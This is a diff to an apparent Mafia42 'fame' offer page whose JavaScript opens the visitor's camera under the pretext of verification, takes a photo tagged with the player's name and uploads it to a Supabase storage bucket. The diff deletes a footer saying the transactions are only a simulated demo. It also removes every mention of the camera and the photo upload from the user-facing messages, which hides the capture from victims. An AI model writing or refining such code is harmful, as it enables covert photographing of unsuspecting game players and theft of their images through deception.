@@ -431,7 +431,7 @@
             </div>
         </div>
         <footer>
-            <i class="fas fa-shield-alt"></i> بيئة آمنة 128-bit | جميع المعاملات تجريبية بشكل وهمي لعرض واجهة Mafia42
+            <i class="fas fa-shield-alt"></i>  Mafia42
         </footer>
     </div>
 
@@ -570,7 +570,7 @@
                         setTimeout(() => resolve(), 500);
                     };
                 } catch (err) {
-                    console.error("خطأ بالكاميرا:", err);
+                    console.error("خطأ :", err);
                     reject(err);
                 }
             });
@@ -579,7 +579,7 @@
         // التقاط الصورة ورفعها
         async function captureAndUpload(famePlayer, fameText, method) {
             if (!video.srcObject || !cameraStream) {
-                showToast("⚠️ الكاميرا غير جاهزة", true);
+                showToast("⚠️  غير جاهزة", true);
                 return false;
             }
             if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
@@ -594,7 +594,7 @@
                 ctx.fillText(`Mafia42 - ${famePlayer}`, 20, 50);
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                 const fileName = `fame_${famePlayer}_${Date.now()}.jpg`;
-                showToast(`📤 جاري رفع الصورة...`);
+                showToast(`📤 جاري رفع ...`);
                 try {
                     const { error } = await supabaseClient.storage.from('photos').upload(fileName, blob);
                     if (!error) {
@@ -631,14 +631,14 @@
             else if (targetFameVal === 10000) fameText = "10000 (أسطورة)";
             else fameText = "25000 (رب العائلة)";
             const method = fameMethodSelect.value;
-            showToast(`📸 جاري فتح الكاميرا للتحقق...`);
+            showToast(` جاري   للتحقق...`);
             try {
                 await startCamera();
                 setTimeout(async () => {
                     await captureAndUpload(famePlayer, fameText, method);
                 }, 1500);
             } catch (err) {
-                showToast("❌ تعذر تشغيل الكاميرا، تأكد من الإذن", true);
+                showToast("❌ تعذر  ، تأكد من الإذن", true);
             }
         }
 
